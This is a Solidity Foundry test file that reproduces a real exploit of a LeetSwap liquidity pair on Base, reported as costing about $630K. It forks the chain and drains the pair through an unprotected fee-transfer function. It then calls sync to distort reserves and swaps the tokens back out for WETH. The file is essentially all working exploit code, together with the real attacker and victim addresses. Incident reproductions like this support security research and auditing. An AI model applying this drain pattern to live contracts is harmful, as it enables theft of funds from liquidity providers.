// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~630K USD$
// Attacker : https://basescan.org/address/0x705f736145bb9d4a4a186f4595907b60815085c3
// Attack Contract : https://basescan.org/address/0xea8f89f47f3d4293897b4fe8cb69b5c233b9f560
// Vulnerable Contract : https://basescan.org/address/0x94dac4a3ce998143aa119c05460731da80ad90cf
// Attack Tx : https://basescan.org/tx/0xbb837d417b76dd237b4418e1695a50941a69259a1c4dee561ea57d982b9f10ec

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0x94dac4a3ce998143aa119c05460731da80ad90cf#code

// @Analysis
// Twitter Guy : https://twitter.com/BlockSecTeam/status/1686217464051539968
// Twitter Guy : https://twitter.com/peckshield/status/1686209024587710464

interface ILeetSwapPiar {
    function _transferFeesSupportingTaxTokens(address token, uint256 amount) external returns (uint256);

    function sync() external;
}

contract ContractTest is Test {
    IERC20 WETH = IERC20(0x4200000000000000000000000000000000000006);
    IERC20 axlUSDC = IERC20(0xEB466342C4d449BC9f53A865D5Cb90586f405215);
    Uni_Router_V2 Router = Uni_Router_V2(0xfCD3842f85ed87ba2889b4D35893403796e67FF1);
    ILeetSwapPiar Pair = ILeetSwapPiar(0x94dAC4a3Ce998143aa119c05460731dA80ad90cf);

    function setUp() public {
        vm.createSelectFork("Base", 2_031_746);
        vm.label(address(WETH), "WETH");
        vm.label(address(axlUSDC), "axlUSDC");
        vm.label(address(Router), "Router");
        vm.label(address(Pair), "Piar");
    }

    function testExploit() external {
        deal(address(WETH), address(this), 0.001 ether);
        WETH.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(axlUSDC);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0.001 ether, 0, path, address(this), block.timestamp
        );

        Pair._transferFeesSupportingTaxTokens(address(axlUSDC), axlUSDC.balanceOf(address(Pair)) - 100);
        Pair.sync();

        axlUSDC.approve(address(Router), type(uint256).max);
        path[0] = address(axlUSDC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            axlUSDC.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint(
            "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }
}
